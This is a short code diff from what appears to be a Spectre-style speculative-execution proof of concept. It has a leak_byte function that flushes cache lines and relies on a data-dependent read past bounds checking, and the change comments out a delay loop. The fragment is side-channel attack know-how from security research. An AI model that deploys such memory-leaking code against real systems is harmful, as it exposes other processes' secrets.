@@ -76,7 +76,9 @@ char leak_byte(std::string_view text, int idx) {
 
         for(int i = 0; i < 500; i++) {
             _mm_clflush(size_in_heap);
-            for(volatile int z = 0; z < 1000; z++) { /* delay! */ }
+
+            // original had a delay here, but it doesnt seem to be necessary on my system
+            //for(volatile int z = 0; z < 1000; z++) { /* delay! */ }
 
             /* 
              * This is a data-dependent read, but because of bounds checking
